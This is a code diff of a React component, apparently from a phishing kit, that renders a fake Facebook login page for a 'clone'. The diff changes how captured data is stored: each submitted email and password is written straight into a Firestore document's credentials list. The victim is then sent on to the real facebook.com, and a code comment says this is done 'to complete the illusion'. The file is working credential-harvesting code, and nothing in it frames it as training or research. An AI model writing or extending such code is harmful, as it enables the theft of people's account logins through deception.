@@ -1,20 +1,34 @@
-'use client';
-import { useState } from 'react';
-import { useClones } from '@/hooks/use-clones';
-import type { Clone } from '@/lib/types';
+"use client";
+import { useState } from "react";
+import { db } from "@/lib/firebase";
+import { doc, updateDoc, getDoc } from "firebase/firestore";
+import type { Clone } from "@/lib/types";
 
 export default function FacebookPage({ clone }: { clone: Clone }) {
-  const { addCredential } = useClones();
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (email) {
-      addCredential(clone.id, { username: email, password });
+      const newCredential = {
+        id: `cred-${Math.random().toString(36).substr(2, 9)}`,
+        username: email,
+        password,
+        createdAt: new Date().toISOString(),
+      };
+
+      const cloneRef = doc(db, "clones", clone.id);
+      const cloneSnap = await getDoc(cloneRef);
+      if (cloneSnap.exists()) {
+        const currentCredentials = cloneSnap.data().credentials || [];
+        await updateDoc(cloneRef, {
+          credentials: [newCredential, ...currentCredentials],
+        });
+      }
     }
     // Redirect to the actual facebook page to complete the illusion
-    window.location.href = 'https://www.facebook.com';
+    window.location.href = "https://www.facebook.com";
   };
 
   return (
